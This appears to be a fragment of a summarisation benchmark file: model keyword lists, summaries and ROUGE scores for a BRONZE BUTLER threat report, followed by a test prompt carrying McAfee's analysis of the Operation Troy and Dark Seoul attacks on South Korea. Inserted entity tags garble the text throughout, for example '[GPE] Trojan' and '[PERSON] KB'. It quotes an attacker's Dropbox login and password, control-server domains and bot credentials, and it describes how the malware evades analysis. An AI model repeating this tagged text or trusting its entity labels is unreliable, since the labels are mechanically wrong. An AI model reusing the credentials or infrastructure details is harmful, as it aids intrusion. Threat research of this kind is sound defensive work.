[DATE] 1st [DATE] \u2013 [DATE] 3rd [DATE] May [DATE] 2018 , \u2026 [ORG] Dubai [ORG] World [ORG] Trade CenterSecureworksGOLD GALLEON : How a Nigerian Shipping IndustryCounter Threat Unit \u2122 Research 2018SecureworksPDF generated automatically by the PDFmyURL HTML to [ORG] PDF [ORG] APICareersRSS [ORG] FeedManage SubscriptionsSitemapPrivacy Policy\ue905 [ORG] USATerms [ORG] & [ORG] ConditionsDell Technologies \u00a9 2018SecureWorks , Inc. [ORG] PDF generated automatically by the PDFmyURL HTML to [ORG] PDF API", "generated_text": "BRONZE BUTLER; threat group; the People's Republic of China; PRC; intellectual property; other confidential data; Japanese organizations; intrusions; network defenders; system defenders; Tick; Tactical; Executives; the strategic assessments; Threat intelligence; Network defenders; time; business; critical assets; attacks; the group; tactics; infrastructure; time; infrastructure management; systems; unauthorized access; the group; their own proprietary malware tools; command; control; infrastructure administrators; procedures; defenders; incident response investigations; research; the threat actors; capabilities; capabilities; the group.", "ref_text": "<START-1>The document provides an analysis of a China-linked cyberespionage threat group called BRONZE BUTLER that has been targeting Japanese organizations since at least 2012. The group uses phishing, strategic web compromises, and zero-day exploits to gain initial access to networks. BRONZE BUTLER has a variety of custom remote access tools and downloaders like Daserf, Datper, and xxmm that communicate with encrypted C2 servers. These tools have keylogging, screenshotting, and data exfiltration capabilities. The group frequently changes infrastructure and tools to evade detection. Once inside a network, BRONZE BUTLER enumerates hosts, escalates privileges, moves laterally, and exfiltrates large amounts of data related to intellectual property, technology, and business operations. The stolen data is often archived and password-protected. The group maintains persistent access to re-enter compromised networks when needed. The report provides strategic and tactical analysis of BRONZE BUTLER's intent, attribution, infrastructure, targeting, malware, tactics, and indicators of compromise. It aims to equip network defenders with insights to detect and respond to this advanced, stealthy threat group. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.46866485013623976, "gpt3/lexical/rouge_rouge2": 0.11506849315068493, "gpt3/lexical/rouge_rougeL": 0.2506811989100818, "gpt3/lexical/rouge_rougeLsum": 0.2506811989100818, "gpt3_generated_text": ["The article discusses the activities of the threat group known as BRONZE BUTLER, which is believed to originate from the People's Republic of China (PRC). The group primarily targets Japanese organizations, especially those involved in critical infrastructure, heavy industry, manufacturing, and international relations. They use tactics such as spearphishing, strategic web compromises, and zero-day vulnerabilities to gain unauthorized access to targeted systems. The group is capable of developing and deploying their own malware tools, and their command and control protocols are encrypted, making it challenging for network defenders and incident responders. The article emphasizes the importance of strategic threat intelligence to determine which organizations are at risk and make defensive decisions. The group's main intent is to exfiltrate intellectual property, product details, and corporate information that they believe could be of value to competing organizations. The article suggests that BRONZE BUTLER is likely based in the PRC, based on various characteristics and links to Chinese cyberespionage groups. The group has a broad range of publicly available and proprietary tools, and they continuously develop and replace their tools. Overall, the article provides insights into the tactics, capabilities, and origin of the BRONZE BUTLER threat group."]}, {"split_name": "test", "sample_id": "test_70", "prompt_text": "Extract the keywords: Dissecting Operation Troy : Cyberespionage in [GPE] South [GPE] KoreaTable of [ORG] Contents [ORG] Executive [ORG] SummaryAttack [ORG] TimelineState [ORG] Sponsorship or Cyberterrorism?The adversariesThe AnalysisThe [PRODUCT] MalwareThe dropper [CARDINAL] TrojanMBR wiperThe remote - access TrojanLinking to the AttackersCode AnalysisRevealing \u201c Operation Troy\u201dPersistent espionage campaign in [GPE] South [GPE] Korea : [CARDINAL] 2009\u20132013Tools and tacticsMilitary Espionage Malware : [CARDINAL] 2009\u20132013The encrypted networkData exfiltrationThe [ORG] DLL relationshipRelationships to Http Dr0pperDestroying the targetThe campaignsConclusionAbout the AuthorsAbout McAfee Labs333 [GPE] South [GPE] Korea was hit by a major cyberattack on [DATE] March [DATE] 20 , [DATE] 2013 , at [TIME] 2:00 [TIME] pm local time . This cyberattack caused a significant amount of damage to the affected organizations by wiping the hard drives of [CARDINAL] tens [CARDINAL] of [CARDINAL] thousands of computers . [ORG] McAfee [ORG] Labs research provides further insight into the likely source of these attacks . Though not definitive , our analysis provides a much clearer picture . The research also indicates that there may have been [CARDINAL] two distinct groups , attacking different targets . Our analysis of this attack \u2014 known [ORDINAL] first as [PERSON] Dark [PERSON] Seoul and now as Operation Troy \u2014 has revealed that in addition to the data losses of the [ORG] MBR wiping , the incident was more than cybervandalism . The attacks on [NORP] South [NORP] Korean targets were actually the conclusion of a covert espionage campaign . [ORG] Attack [ORG] Timeline Our analysis suggests the following order of these attacks . Later in this report we mention other elements that color our view of this event , but consistent throughout is our belief that the attackers had access to the environments prior to launching the wiping component . [DATE] March [DATE] 20 attack against banks and news agencies in [GPE] South [GPE] Korea:1 . The remote - access [PERSON] Trojan was compiled [DATE] January [DATE] 26 , [DATE] 2013 . [CARDINAL] 2 . The component to wipe the master boot record ( [ORG] MBR ) of numerous systems was compiled [DATE] January [DATE] 31 . [CARDINAL] 3 . An initial victim within the organization was spear - phished with the remote - access [GPE] Trojan . This likely occurred beforeMarch 20 , and possibly [DATE] weeks prior to the attack.4 . The dropper was compiled [DATE] March [DATE] 20 , [DATE] hours before the attack occurred . [CARDINAL] 5 . The dropper was distributed to systems across the victim organizations , and within [TIME] minutes of execution the [ORG] MBRswere wiped . This occurred [TIME] around [TIME] 2:00 [TIME] pm [GPE] Seoul time on [DATE] March [DATE] 20.State Sponsorship or Cyberterrorism ? Who conducted these attacks is still unclear , but our research gives some further insight into the likely source . The clues left behind confirm that the [CARDINAL] two groups claiming responsibility were a fabrication to throw investigators off the trail and to mask the true source . The adversaries The [CARDINAL] two groups that appear to have been involved in the attacks have had no prior connection until now.\u2022 NewRomanic Cyber Army Team . The samples connected to this group are more convincing . The majority of the wipers(found in the wild and retrieved from infected systems through other sources ) contain the strings \u201c principes \u201d and \u201c hastati , \u201d which also appear in a message left on [CARDINAL] one of the targeted websites in the form of a web pop - up . The wiper component also overwrote the [ORG] MBR with [CARDINAL] one of these strings . The following data points support this fact : \u2013 The strings \u201c principes\u201d1 and \u201c hastati\u201d2 were found within the code of some of the wiper components . The samestrings were also found in the web pop - up message that was left on the Nocut News [GPE] Korea website . The strings are ancient Roman terms that make reference to military units , hence a \u201c cyberarmy . \u201d The pop - up even states some of the specific units that were part of hastati which were involved in this attack . \u2013 The remote - access [GPE] Trojan that was found had a build path which included the reference \u201c Make Troy , \u201d a subdirectory of the folder \u201c Work . \u201d Troy [CARDINAL] 3 refers to an ancient [LOC] Roman region , again connecting the Roman references to this group , which consistently uses this theme.3\u2022 [ORG] The [ORG] Whois [ORG] Hacking [ORG] Team . On [DATE] March [DATE] 20 , the website of the network provider [FAC] LG + U was defaced by this group . Was it a coincidence that a [ORDINAL] second group was involved ? All of the evidence indicates that they had a strong involvement , but there is no solid link to the group because it did not claim involvement in the attacks . However , we do have the circumstantial link of a wiper component that in practice operated differently from the wipers employed by [ORG] the [ORG] NewRomanic [ORG] Cyber [ORG] Army yet also appears to be essentially the same wiper . [ORG] The [ORG] Whois [ORG] Hacking [ORG] Team MBR wiper component includes the same graphics ( in a resource file in the binary ) that appeared on the defaced LG + U website , although the malware did not behave the same way . Within the main executable file , however , we discovered a small portion of the code that matched the structure of that of [ORG] the [ORG] NewRomanic [ORG] Cyber [ORG] Army wipers we found , so [ORG] the [ORG] Whois [ORG] Team likely dropped the same wiper . State sponsored or not , these attacks were crippling nonetheless . The overall tactics were not that sophisticated in comparison to what we have seen before . The trend seems to be moving toward using the following techniques against targets:\u2022 Stealing and holding data hostage and announcing the theft . Public news media have reported only that tens ofthousands of computers had their MBRs wiped by the malware . But there is more to this story : The main group behind the attack claims that a vast amount of personal information has been stolen . This type of tactic is consistent with [PERSON] Anonymous operations and others that fall within the hacktivist category , in which they announce and leak portions of confidential information.\u2022 Wiping the [ORG] MBR to render systems unusable , creating an instant slowdown to operations within the targetThe Analysis What were the motives behind these attacks and why did the attackers chose certain targets ? The attacks managed to create a significant disruption of [ORG] ATM networks while denying access to funds . This was n\u2019t the [ORDINAL] first time that this type of attack \u2014 in which destructive malware wiped the systems belonging to a financial institution \u2014 has occurred in [GPE] South [GPE] Korea . In [DATE] 2011 the same financial institution was hit with destructive malware that caused a denial of service . The attackers left a calling card [DATE] a [DATE] day after the attacks in the form of a web pop - up message claiming that [ORG] the [ORG] NewRomanic [ORG] Cyber [ORG] Army [ORG] Team was responsible and had leaked private information from several banks and media companies . They also referenced destroying the data on a large number of machines ( the [ORG] MBR wiping ) and left a message in the web pop - up identifying the group behind the attacks . The page title in Internet Explorer was \u201c Hey , [WORK_OF_ART] Everybody [WORK_OF_ART] in Korea????\u201d\u201cHi , [WORK_OF_ART] Dear [WORK_OF_ART] Friends , We are very happy to inform you the following news . We , [ORG] NewRomanic [ORG] Cyber [ORG] Army [ORG] Team , verified our # OPFuckKorea2003 . We have now a great deal of personal information in our hands . Those includes ; 2.49 M of _ member table data , [ORG] cms_info [CARDINAL] more [CARDINAL] than 50 M from . Much information from [ORG] Bank . We destroyed more than 0.18 M of PCs . Many auth [PERSON] Hope you are lucky . 11th , 12th , 13th , 21st , [DATE] 23rd [DATE] and [DATE] 27th HASTATI Detachment . Part of [ORG] PRINCIPES [ORG] Elements . p.s For more information , please visit www.dropbox.com login with joseph.r.ulatoski@gmail.com::lqaz@WSX3edc$RFV . Please also visit pastebin.com . \u201dThe [PERSON] Malware A few types of malware were involved in these attacks . Each variant had a particular use . Some public reports mentioned only the use of the wiper component ; however , there were actually [CARDINAL] three components , all with a different purpose , that assisted the attackers in the campaign . [ORG] ComponentDropper TrojanMBR WiperPurposeFile [ORG] SizeCompile [ORG] DateInstalls the [ORG] MBR wiperWipes the [ORG] MBR of the disk418KB24KB46KBMarch [DATE] 20 , [DATE] 2013January [DATE] 31 , [DATE] 2013January [DATE] 26 , 2013Remote - Access TrojanProvides backdoor access to attackersTable [CARDINAL] 1 : Elements of the attack on [NORP] South [NORP] Korean targets.4There were [CARDINAL] two subsequent aspects to this attack:\u2022 The destruction of PCs using the [ORG] MBR wiper component . Occurred [DATE] March [DATE] 20 . \u2022 Remote access to the targets \u2019 environments for a period prior to the attack . The duration of this access is unknown . The dropper [PRODUCT] Trojan The dropper [GPE] Trojan was primarily used to download the executable that destroyed the systems [DATE] \u2019 [DATE] MBRs . We suspect that the dropper [GPE] Trojan was distributed at the time of the attacks via a compromised patch - management server that pretended to run a legitimate update . The dropper [PERSON] Trojan was compiled [DATE] March [DATE] 20 , the day of the attack and [TIME] several [TIME] hours prior to the destruction of the systems . We suspect that the attackers had access to the target environment prior to [DATE] March [DATE] 20 . It is unlikely that a large volume of users ( some 30,000 + ) were spear - phished on [DATE] March [DATE] 20 alone . It \u2019s likely a much earlier compromise led to the attacks \u2019 being staged internally . Thus , there was an initial victim whose infected system allowed the attackers to gain access to other systems that let them distribute the malware broadly . The initial infection certainly could have come from a spear - phishing attack . The backdoor component was compiled in [DATE] late [DATE] January . The attackers could have been inside the networks since [DATE] February . This timeline is plausible given that the attackers claim to have stolen a vast amount of information from these networks prior to wiping the MBRs . Our further analysis led us to discover additional components that support our conclusion:\u2022 A remote - access [GPE] Trojan was discovered to have compromised some of the target environments , specifically an internalserver used to distribute updates to [CARDINAL] thousands of PCs . This [GPE] Trojan variant was compiled [DATE] January [DATE] 26 , and was detected by the security industry on [DATE] March [DATE] 25 . McAfee detects this threat as RDN / Generic [ORG] PWS.y!io . This [GPE] Trojan was built with [ORG] the [ORG] Microsoft [ORG] Visual [ORG] C++ [ORG] Version [CARDINAL] 2.9 compiler with a file size of [CARDINAL] 47KB.MBR wiper We have seen several wiper samples to date ; all were compiled [DATE] January [DATE] 31 . The wiper itself is relatively small ( [CARDINAL] 24 [PERSON] KB ) and is the [ORG] MBR wiper component . This file is placed in the infected user \u2019s application data folder , executes , and immediately starts the countdown to wipe the system and render it unbootable . This file was compiled [DATE] approximately [DATE] two [DATE] months prior to the attack \u2019s taking place . The main dropper component was compiled [DATE] the [DATE] day of the attack , [DATE] March [DATE] 20 , at [TIME] 4:07 [TIME] am [TIME] Seoul [TIME] time . The dropper installed the wiper , which destroyed the MBRs at [TIME] around [TIME] 2:00 [TIME] pm [GPE] Seoul time . Once the dropper executed , the system were wiped within [TIME] minutes . Thus , these components likely were n\u2019t distributed until the time when the attackers wished to destroy these machines . The remote - access [GPE] Trojan It \u2019s not widely known that the attackers used a remote - access [GPE] Trojan to compromise an internal server . The attackers used this internal server to distribute the wiper component to the [CARDINAL] thousands of PCs . The remote - access [ORG] Trojan had a file size of [CARDINAL] 46 [PERSON] KB and was compiled on [DATE] January [DATE] 26 , [DATE] five [DATE] days before the MBR wiper was compiled . As we concluded earlier , we have determined that the attackers had access to the environment prior to wiping the systems . The remote - access [PERSON] Trojan was likely delivered to an internal PC via a spear - phishing campaign . From this system the attackers accessed other internal resources . The [PERSON] Trojan was designed to operate within Internet Explorer ; it launched a hidden instance of Internet Explorer and injected itself into the running process.5Figure [CARDINAL] 1 . The process monitor shows the remote - access [GPE] Trojan spawning an instance of Internet Explorer . The [GPE] Trojan immediately modified the properties in the registry to allow for remote connections to the system . Linking to the Attackers Linking malware to its developers is n\u2019t always an easy task . Most attackers are careful enough to ensure they ca n\u2019t be traced . This is especially important in cases such as cyberespionage , in which the intent is to remain invisible . In our analysis we observed a number of unique attributes in the components involved in these attacks ; these markers allowed us to link specific samples to a specific group . [CARDINAL] Two groups have taken credit for these attacks , but we can tell that the variants which wiped the systems link to [ORG] the [ORG] NewRomanic [ORG] Cyber [ORG] Army [ORG] Team . Although [ORG] the [ORG] Whois [ORG] Hacking [ORG] Team is more public due to its defacement of the network provider [FAC] LG + U \u2019s website , we can link this group to [CARDINAL] only [CARDINAL] one sample of a wiper , which operates differently than the others . The Whois wiper is much larger , with a file size of [CARDINAL] 236 [PERSON] KB and was compiled [DATE] March [DATE] 19 , whereas the other wiper components are a mere [CARDINAL] 24 [PERSON] KB . The larger size suggests the Whois wiper contains more functions . Thus , we can definitively link [ORG] NewRomanic to the samples used to wipe the MBRs of systems within the [NORP] South [NORP] Korean financial institution networks . [ORG] NewRomanic will remain the prime suspect involved in the attacks . Confirming the link between [ORG] NewRomanic and known wiper samples , we found a number of wiper samples contained The [PERSON] Trojan contained a build path that mentions Troy in the directory path , again consistent with the ancient Roman references used by this group . Figure [CARDINAL] 2 . The remote - access [GPE] Trojan names [PERSON] Troy . This reference links the attack to [ORG] the [ORG] NewRomanic [ORG] Cyber [ORG] Army [ORG] Team . Code Analysis It is highly unusual that [CARDINAL] two groups claim responsibility for these attacks . No further information has been revealed as to who they are or what their motivations are ; this is another reason to suspect that these [CARDINAL] two groups are the same and are actually fabricated . The supporting evidence comes in the form of code analysis determining the degree of similarity between the samples . [ORG] The [ORG] Whois [ORG] Hacking [ORG] Team sample was compiled [DATE] March [DATE] 19 at [TIME] 1:57 [TIME] pm local time and the [ORG] NewRomanic dropper was compiled [DATE] March [DATE] 20 at [TIME] 4:07 [TIME] am local time . The attacks on [NORP] South [NORP] Korean banks and media and the defacement of [ORG] LG + U occurred approximately [TIME] 2:00 [TIME] pm local time on [DATE] March [DATE] 20.McAfee Labs investigated the differences between the [CARDINAL] two samples at a code level to determine if there were any similarities . In spite of the fact that the wiper component originating from [ORG] NewRomanic [ORG] Cyber [ORG] Army [ORG] Team was [CARDINAL] 24 [PERSON] KB in size and the component from [ORG] Whois was [CARDINAL] 236 [PERSON] KB , we did find similarities within the code . The [PERSON] Whois sample is a dropper for a component that closely resembles the one used by [ORG] the [ORG] NewRomanic [ORG] Cyber [ORG] Army . We found a significant number of matching subroutines and a large number of code segments with only minor differences . These similarities lead us to conclude that the payload code is based upon the same initial code and was embedded into different droppers . Whois [NORP] SampleNewRomanic Sample [CARDINAL] # of Different Functions_alloca_probe_alloca_probeexact matchsub_4078C0sub_4030A0loc_404f54loc_4033a1loc_4065f4startsub_402D02sub_407c7asub_4083F5sub_403770loc_40291Floc_302f40loc_403169loc_4084eeloc_403694sub_401870sub_407BC9sub_402DB3sub_40327Dsub_409980Table [CARDINAL] 3 : Partial analysis of subroutine differences.15171exact matchexact match1310104exact matchRevealing \u201c Operation Troy \u201d Persistent espionage campaign in [GPE] South [GPE] Korea : [ORG] 2009\u20132013 [ORG] Public reports covering what is known as [FAC] the [FAC] Dark [FAC] Seoul incident , which occurred on [DATE] March [DATE] 20 , [DATE] 2013 , addressed only the [ORG] MBR wiper components . Many of the details of this incident have been examined , and most analysts conclude this was an isolated , though clearly coordinated , attack . However , [PERSON] McAfee [PERSON] Labs has found that there was more to the incident than what was widely reported . Our analysis has revealed a covert espionage campaign . Typically this sort of advanced persistent threat ( [ORG] APT ) campaign has targeted a number of sectors in various countries , but [GPE] Operation [GPE] Troy , as these attacks are now called , targets solely [LOC] South [LOC] Korea.7From our analysis of unique attributes within the malware samples we have determined that the initial code behind the \u201c Troy \u201d family of [NORP] Trojans was created in [DATE] 2010 , as was another component that was dropped by [ORG] the [ORG] Trojan [ORG] HTTP [ORG] Troy . The malware used in these attacks were compiled to specifically target [GPE] South [GPE] Korea and used [NORP] Korean - language resources in the binaries . The malware connected to legitimate [NORP] Korean domains that were running a bulletin board and sent a specific command to a [ORG] PHP page to establish an [ORG] IRC channel and receive commands . Espionage CampaignOperation Troy \u2014 Domestic Spying PeriodDark Seoul20092010201120122013March 20,2013US / South Mail AttackHttp Dr0pper TDropDDoS Attacks10 Days of RainMedia / Broadcast AttacksFinancial Industry AttacksSuspected LinkSolid LinkHighly Probable LinkFigure [CARDINAL] 3 . The targeted attack [PERSON] Dark [PERSON] Seoul reached its culmination in [DATE] March [DATE] 2013 , but its roots go back at least to [DATE] 2009 , when the [GPE] Trojan \u2019s source code was [ORDINAL] first compiled . Subsequent variations of the malware have also been involved in these threats . [PERSON] McAfee [PERSON] Labs has determined that domestic espionage activities occurred before [EVENT] the [EVENT] March [EVENT] 20 attacks , most likely to gain intelligence regarding the targets to carry out further attacks ( such as the [DATE] March [DATE] 20 incident ) or to benefit the attackers in some other ways . This spying operation had remained hidden and only now has been discovered through diligent research and collaboration . We also suspect the attackers had knowledge of the security software running within the environment before they wiped the systems , given that some of the variants used in the attack were made to look as if they were antimalware update files from before [DATE] March [DATE] 20.The attackers who conducted the operation remained hidden for [DATE] a [DATE] number [DATE] of years prior to the [DATE] March [DATE] 20 incident by using a variety of custom tools . Our investigation into [PERSON] Dark [PERSON] Seoul has found a long - term domestic spying operation underway since [DATE] at [DATE] least [DATE] 2009 . The operation , all based on the same code , has attempted to infiltrate specific [NORP] South [NORP] Korean targets . We call this Operation Troy , based on the frequent use of the word Troy in the compile path strings in the malware . The prime suspect group in these attacks is [ORG] the [ORG] New [ORG] Romanic [ORG] Cyber [ORG] Army [ORG] Team , which makes frequent use of Roman and classical terms in their code . While analyzing malware components from before the [DATE] March [DATE] 20 incident we found both similar and identical attributes of the files involved that enable us to link them to the [CARDINAL] 3Rat remote administration tool client used on [DATE] March [DATE] 20 as well as to samples dating to [DATE] 2010 . Furthermore , we determined that through prior access to the victims \u2019 networks , the attackers were able to upload the [ORG] MBR wiper component and distribute it . It is also possible that the campaign known as 10 Days of Rain is a byproduct of [ORG] Operation [ORG] Troy ; some of our analysis suggests that the malware [PERSON] Concealment [PERSON] Troy was present in these attacks . [ORG] Tools and tactics [ORG] NSTAR : [CARDINAL] 2010\u20132011 [ORG] NSTAR appears to be the [ORDINAL] first production version of the [PERSON] Troy family . This [GPE] Trojan is based upon malware created for a military espionage campaign that [ORDINAL] first emerged in [DATE] 2009 . [ORG] NSTAR is the [ORDINAL] first to use components in the same way that later variants of the [PERSON] Troy family do . It included a shared [ORG] DLL ( [ORG] bs.dll ) that was found in the [DATE] 2010 and [DATE] 2011 variants . Later variants use a modified version , HTTPSecurityProvider.dll , which employs nearly the same file - mapping function as used by [ORG] bs.dll . Most of these variants are compiled from the Work directory ; that \u2019s fairly consistent throughout all versions . The [ORG] DLL was compiled using [ORG] Microsoft [ORG] Visual [ORG] C++ [ORG] Version 6 . Those iterations were found in [DATE] 2010 - 2011.8The call graph generated for [ORG] NSTAR \u2019s [ORG] bs.dll is identical with that of HTTP Troy . They were compiled [DATE] at [DATE] least [DATE] a [DATE] year apart from each other . Figure [CARDINAL] 4 . Call graph for [ORG] bs.dll from the [ORG] NSTAR variant of [ORG] the [ORG] Troy [ORG] Trojan . Figure [CARDINAL] 5 . Call graph for [ORG] bs.dll from the HTTP Troy variant . The [ORG] DLL was compiled [DATE] March [DATE] 3 , [DATE] 2011 , and includes an OCX component that was compiled in late 2010 . The OCX used a very different compile path , but [ORG] bs.dll , the backdoor , is essentially the same as those seen in later versions . The Work directory , with path shown below , is also used with Troy variants [PERSON] Concealment [PERSON] Troy and [CARDINAL] 3Rat Client , which were both compiled in 2013.E:\\Work\\BackUp\\2011\\nstar_1103\\BackDoor\\BsDll - up\\Release\\BsDll.pdb9We also found a file - mapping function in this variant similar to those in most of the newer versions . The unique string beginning with \u201c FFFFFFF \u201d is identical and occurs throughout the later variants . Figure [CARDINAL] 6 . [ORG] NSTAR \u2019s file - mapping function . The malware establishes an [ORG] IRC channel to receive real - time commands in the same manner as the military espionage malware . Figure [CARDINAL] 7 . [ORG] NSTAR communicates with its control server via HTTP as its primary channel . [PERSON] Chang and EagleXP : [DATE] 2010 Another variant from [DATE] 2010 , EagleXP , is closely related to [ORG] NSTAR and HTTP Troy based on reused components . EagleXP used this compile path : D:\\VMware\\eaglexp(Backup)\\eaglexp\\vmshare\\Work\\BsDll - up\\Release\\BsDll.pdbAgain we see the Work directory involved as in the other post-2010 malware used in this campaign . A variant compiled [DATE] May [DATE] 27 , [DATE] 2010 , also contained a very similar compile path . We were able to obtain some traffic from the control server . D:\\\\Chang\\\\vmshare\\\\Work\\\\BsDll - up\\\\Release\\\\BsDll.pdbThe [DATE] May [DATE] 27 variant , called [PERSON] Chang , operated in the same manner as other Troy variants and used the same [ORG] bs.dll . A [NORP] Korean manufacturing website hosted both the control server and an [ORG] IRC server . Figure [CARDINAL] 8 . Outbound traffic from an infected system . Figure [CARDINAL] 9 . The malware establishes a channel with the control server via IRC.Both the [PERSON] Chang and EagleXP variants are based on the same code that created [ORG] NSTAR and later Troy variants . These similarities confirm the attackers have operated for [DATE] more [DATE] than [DATE] three [DATE] years against [NORP] South [NORP] Korean targets.10Inside the [ORG] IRC botnetTroy BotnetToneharbor.comNowq.netSujewha.comTraveler.foxlink.comDong.a.jpHanja.edu.comQitaegyo.comBabcom - h1.bluethunder.coHTTP TroyLawbookcenter.co.krSolarshare.co.krByonshop.comDochang.pe.krNSTARTDropHttpDr0pperTongDelmundo.krTheumin.netGcglobal.comApsumo.co.krConcealmentTroyMupa.co.krFigure [CARDINAL] 10 . The malware family and its control servers . During our investigation we dug into the attackers \u2019 controlling botnet , which was used until [DATE] 2013 . The infrastructure relied upon on a network of hacked [NORP] South [NORP] Korean websites hosting [ORG] IRC servers . The infected clients in turn communicated with the [ORG] IRC servers using [ORG] RSA encryption and used functions imported from the Microsoft Cryptography API library . Figure [CARDINAL] 11 . Some functions imported from the [ORG] Microsoft Cryptography API.11The attackers hardcoded the control domains in [ORG] bs.dll and distributed it in the final compiled [PERSON] Trojan code . Each variant of each generation of [NORP] Trojans contained different hardcoded strings pertaining to the control servers . This shows that the attackers [ORDINAL] first compromised the future [ORG] IRC server sites and then compiled the component and distributed it to infected targets . Figure [CARDINAL] 12 . Hardcoded addresses in [ORG] bs.dll . The nickname for the bot can be determined by the outbound traffic and information written to the Windows registry . [CARDINAL] One variant operating in [DATE] June [DATE] 2010 used the nickname BS^000C2918AB11 with the password wodehaopeng . The malware joined the [ORG] IRC channel # god and sent several private messages to what was likely the control server to receive instructions . PRIVMSG X^111112352643[1 ] : A5TbaKuqCO641tirNl51rFLdNHeUhMbUiJ93sO5rip9X7AZG0Y8rlZVmItEEfDrmNL19OpJrv2khO5WbflTqxs7FVgzUNfdvtnjbObWeNNVPlF / yXPQIEDj/4YnidGDAq p7m8lFpnC2Pyz2 + 6OOooEUMqG6rKImyFQLM / V7K69E = [ORG] VariantHttp Dr0pperHTTP TroyTDropNSTARTongEagleXPChangBot IRC NicknameYN^000E0C3CB868B9^E02E29C4TE02E29CH^E02E29C4CO^000E0C2892FAB3 ^ 000C2918AB11X^000C295C5DECTable [CARDINAL] 4 : [ORG] IRC bot nicknames used by variants . HTTP Troy : [DATE] 2011 In [DATE] 2011 the attackers created [ORG] the [ORG] Trojan [ORG] HTTP [ORG] Troy , named from its compile path string ; this was the [ORDINAL] first of the [PERSON] Troy family of [NORP] Trojans . To date we have found [CARDINAL] only [CARDINAL] one sample of [ORG] HTTP [ORG] Troy . Upon execution the malware launches a crippled [ORG] GUI that allows the victim to install a screen saver displaying politically sensitive images . We do n\u2019t know why the developers took the risk of making the [PERSON] Trojan visible . The screensaver component ( chonanship.scr ) is not malicious and was compiled on [DATE] December [DATE] 12 , [DATE] 2010 . It contained images related to the sinking of [ORG] the [ORG] South [ORG] Korean [ORG] Navy ship Cheonan.4 HTTP Troy was compiled on [DATE] March [DATE] 20 , [DATE] 2011 , and contained the compile path Z:\\source\\1\\HttpTroy\\BsDll - up\\Release\\BsDll.pdb . As we can see , HTTP Troy uses the same [ORG] DLL as the [ORG] NSTAR , [PERSON] Chang , and EagleXP variants did in [DATE] 2010 . This path was contained in a dropped [ORG] DLL component that was used to establish a hidden [ORG] IRC channel to the attackers \u2019 control server . The primary dropper file for this remote - access [GPE] Trojan was disguised as [ORG] AhnLab \u2019s [ORG] Smart [ORG] Update [ORG] Utility setup program . The original filename was SUpdate.exe . After executing , the remote - access [ORG] Trojan makes a connection to sujewha.com , the [ORG] IRC control server . Figure [CARDINAL] 13 . HTTP Troy communicates with its control server via IRC.12Http Dr0pper : 2012 We found a [ORDINAL] second - generation [GPE] Trojan based on HTTP Troy that included the compile path Z:\\1Mission\\Team_Project\\ [ 2012.6~]\\HTTP Troy\\HttpDr0pper\\Win32\\Release . This [PERSON] Trojan , Http Dr0pper , was compiled in [DATE] 2012 from the HTTP Troy directory , indicating it is an advancement of the original HTTP Troy . All of the variants from this point reuse a specific [ORG] DLL , which in some instances is named HTTPSecurityProvider.dll and uses the Microsoft Cryptography API to secure communications . We can track the reuse of this [ORG] DLL based on the consistent file - mapping function that appears throughout the variants . Figure [CARDINAL] 14 . The malware Http Dr0pper using the same file - mapping function and [ORG] DLL as other versions . We can determine that another variant , [GPE] Tong ( based on the directory in which it was compiled ) , also reuses this [ORG] DLL and contains the same function . Figure [CARDINAL] 15 . The malware Tong using the same file - mapping function and [ORG] DLL as other versions . Furthermore , variants such as [PERSON] Concealment [PERSON] Troy that were compiled in [DATE] 2013 contain the same function once decoded . Still , some of the base code is reused in the supporting [ORG] DLL for [PERSON] Concealment [PERSON] Troy . Figure [CARDINAL] 16 . The malware [PERSON] Concealment [PERSON] Troy using the same function ( encoded function shown).After execution the [GPE] Trojan makes a connection to the control server using specific parameters that include the [ORG] IRC nickname . This communication pattern is consistent with other variants that reference Troy . Figure [CARDINAL] 17 . Communicating with the control server . Tong : 2012 The [GPE] Tong variant contains the compile path [PERSON] E:\\Tong\\Work\\Op\\1Mission\\Team_Project\\[2012.6~]\\HTTP [PERSON] Trojan 2.0\\HttpDr0pper\\ Win32\\Release . It also communicated using the same methods . This [PERSON] Trojan was compiled on [DATE] August [DATE] 28 , 2012.Figure [CARDINAL] 18 . Tong communicating with its control server.13Compile [ORG] DateCompile PathJuly 4 , 2012July 7 , 2012August 28 , 2012August 29 , [CARDINAL] 2012Z:\\1Mission\\Team_Project\\[2012.6~]\\HTTP Troy\\HttpDr0pper\\Win32\\Release\\3HttpDropper.pdbZ:\\1Mission\\Team_Project\\[2012.6~]\\HTTP Troy\\HttpDr0pper\\Win32\\Release\\HttpSecurityProvider.pdbZ:\\1Mission\\Team_Project\\[2012.6~]\\HTTP Troy\\HttpDr0pper\\Win32\\Release\\HttpSecurityProvider.pdbZ:\\1Mission\\Team_Project\\[2012.6~]\\HTTP Troy\\HttpDr0pper\\Release\\HttpSecurityProvider.pdbTable [CARDINAL] 5 : Components dropped by [GPE] Tong . TDrop : [DATE] 2013 [ORG] TDrop is the [ORDINAL] third generation of HTTP Troy . [ORG] TDrop uses [CARDINAL] one of [CARDINAL] two [ORG] DLL files , payload32.dll and payload64.dll , and injects one , depending on operating system , into svchost.exe . Previous versions used [ORG] bs.dll , which contained the code for communicating with the [ORG] IRC botnet . [ORG] TDrop has some further functionality not present in HTTP Troy that extends this [GPE] Trojan \u2019s ability to operate on [CARDINAL] 64 - bit machines and to evade automated analysis systems and emulation technologies . The evasion routines check for the presence of debuggers and tracers that attach to the parent process . This effectively causes the parent process to immediately terminate when under analysis by emulation or sandboxing systems that attempt to hook and monitor API calls coming from that process . Figure [CARDINAL] 19 . The antidebugging feature in payload32.dll . Furthermore , [ORG] TDrop uses a [ORG] DLL to run under nonprivileged accounts on [EVENT] Windows [EVENT] 7 . This variant was compiled on [DATE] January [DATE] 15 , [DATE] 2013 , and contained the compile path D:\\Work\\Op\\Mission\\TeamProject\\[2012.11~12]\\TDrop\\Dropper32\\Release\\ Dropper.pdb . The main executable , which extracts the other components , was compiled from the path Z:\\Work\\v3zip\\ misc.c and Z:\\Work\\v3unzip.c . This is likely a compression tool to extract the files to the desktop . Just as Http Dr0pper , [ORG] TDrop uses the disguised dropper component [PERSON] AhnlabUpdate.exe . The unique code is nearly identical to that used in Http Dr0pper with the exception of the last [CARDINAL] two characters . Figure [CARDINAL] 20 . [ORG] TDrop reusing code from [ORG] Http Dr0pper.14When the main [PERSON] Trojan file executes , it launches [PRODUCT] RunCmd.exe , which itself does n\u2019t appear to be malicious . RunCmd.exe then launches [ORG] AhnlabUpdate.exe based on the specified filename in the associated [PERSON] RunCmd.ini file . These files are created in the directory [CARDINAL] 